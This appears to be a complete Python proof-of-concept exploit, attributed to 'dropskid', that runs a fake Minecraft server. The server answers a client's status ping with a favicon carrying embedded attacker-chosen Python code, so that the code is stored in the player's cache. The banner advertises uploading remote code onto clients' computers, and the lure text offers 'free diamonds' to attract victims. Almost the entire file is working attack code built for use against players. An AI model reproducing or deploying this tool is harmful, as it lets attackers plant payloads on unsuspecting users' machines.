# Minecraft cache exploit PoC
# by dropskid @ github.com/dropsql
# 01.03.2021


import os
import sys
import json
import time
import socket
import struct
import base64
import argparse

from typing import *

from rich.console import Console

console = Console(log_time_format='`%X`')

def make_payload(code: str, favicon: bytes) -> dict:
    favicon += b'[<code_start>]%s[<code_end>]' % code.encode()

    payload = json.dumps({
        'version': {
            'name': 'CoolSpigot 1.3.3.7',
            'protocol': 47
        }, 'players': {
            'max': 1,
            'online': 0,
        }, 
        'description': 'join for free diamonds',
        'favicon': f'data:image/png;base64,{base64.b64encode(favicon).decode()}'
    }).encode()

    packet = data_pack(varint_pack(0) + data_pack(payload))
    return packet

def varint_unpack(s: bytes) -> Tuple[int, str]:
    d, l = 0, 0; length = len(s)
    if length > 5:
        length = 5
    for i in range(length):
        l += 1; b = s[i]; d |= (b & 0x7F) << 7 * i
        if not b & 0x80:
            break
    return (d, s[l:])

def varint_pack(digit: int) -> bytes:
    ordinal = b''
    for _ in range(5):
        b = digit & 0x7F; digit >>= 7
        ordinal += struct.pack("B", b | (0x80 if digit > 0 else 0))
        if digit == 0:
            break
    return ordinal

def data_pack(data: bytes) -> bytes:
    return varint_pack(len(data)) + data

BANNER = '''[red]            

M   M  CCC  CCC EEEE 
MM MM C    C    E    [grey37]1.0.0[/grey37]
M M M C    C    EEE  [pink1]minecraft cache exploit PoC[/pink1]
M   M C    C    E    [cyan](upload remote python code on clients computers)[/cyan]
M   M  CCC  CCC EEEE [pink1]made by drops (github.com/dropsql)[/pink1]
[/red]
'''

console.print(BANNER)

parser = argparse.ArgumentParser(usage='%(prog)s [options]')

parser.add_argument('-lh', '--lhost', default='localhost', required=False, metavar='', help='local host (default: localhost)', dest='host', type=str)
parser.add_argument('-p', '--port', default=1337, required=False, metavar='', help='local port (default: 1337)', dest='port', type=int)
parser.add_argument('--payload', required=True, metavar='', help='payload to exec', dest='payload', type=str)
parser.add_argument('--favicon', required=True, metavar='', help='favicon to embed', dest='favicon', type=str)

args = parser.parse_args()

try:
    code = '\n'.join([x.strip() for x in open(args.payload).readlines()])
except:
    console.log('failed to load payload code.')
    sys.exit()

try:
    fav = open(args.favicon, 'rb').read()
except:
    console.log('failed to load favicon.')
    sys.exit()

payload = make_payload(code, fav)

console.log(f'new payload lenght: {len(payload)} bytes')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server.bind((args.host, args.port))

console.log(f'server server listening on "{args.host}:{args.port}"')

server.listen(1337)

remote_socket, remote_addr = server.accept()
buf = remote_socket.recv(1)
packet_lenght, _ = varint_unpack(buf)
data = remote_socket.recv(packet_lenght)
packet_id, data = varint_unpack(data)

if packet_id == 0 and data.endswith(varint_pack(1)):
    console.log(f'"{remote_addr[0]}:{remote_addr[1]}" sent SLP packet')
    remote_socket.send(payload) # send the packet to the victim
    console.log('payload has been sent to the victim.')
    time.sleep(5) # wait for the victim get the whole packet and store it
    console.log('exploit is done.')
    sys.exit()
else:
    console.log('victim didn\'t sent any SLP handshake.')
    sys.exit()
